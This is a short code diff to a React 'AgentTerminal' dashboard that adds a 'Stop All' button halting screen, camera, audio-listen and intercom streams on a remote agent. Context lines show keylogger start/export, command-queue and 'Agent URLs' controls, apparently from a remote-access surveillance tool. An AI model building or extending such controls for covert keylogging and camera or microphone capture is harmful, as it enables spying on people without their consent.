@@ -250,6 +250,14 @@ export default function AgentTerminal({ agent, onClose, onOpenHistory }: Props) 
         <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
           <button className="btn secondary" onClick={refreshStats}>Refresh</button>
           <button className="btn secondary" onClick={() => { if (confirm('Reset the command queue?')) { dashboardSocket.queueReset(agent.agent_id); setLines((prev) => [...prev, '[Queue] Reset requested']); } }}>Refresh Queue</button>
+          <button className="btn secondary" onClick={() => {
+            try { dashboardSocket.stopScreen(agent.agent_id) } catch {}
+            try { dashboardSocket.sendAgentJson(agent.agent_id, { type: 'camera_stop' }) } catch {}
+            try { dashboardSocket.audioListenStop(agent.agent_id) } catch {}
+            try { dashboardSocket.intercomStop(agent.agent_id) } catch {}
+            try { dashboardSocket.audioStop(agent.agent_id) } catch {}
+            setLines((prev)=>[...prev, '[Stop All issued]'])
+          }}>Stop All</button>
           <button className="btn secondary" onClick={() => { if (confirm('Hard reset the agent connection? This will drop and reconnect.')) { dashboardSocket.hardReset(agent.agent_id); setLines((prev) => [...prev, '[Hard reset requested]']); } }}>Hard Reset</button>
           <button className="btn secondary" onClick={async () => { if (!keylogRunning) { dashboardSocket.startKeylog(agent.agent_id); setKeylogRunning(true); setShowKeylog(true); } else { dashboardSocket.stopKeylog(agent.agent_id); setKeylogRunning(false); try { await keylogRef.current?.exportAndSave() } catch {} } }}>{keylogRunning ? 'Stop Keylog' : 'Start Keylog'}</button>
           <button className="btn secondary" onClick={() => { setMastersOpen(true); dashboardSocket.sendAgentJson(agent.agent_id, { type: 'masters_list' }) }}>Agent URLs</button>
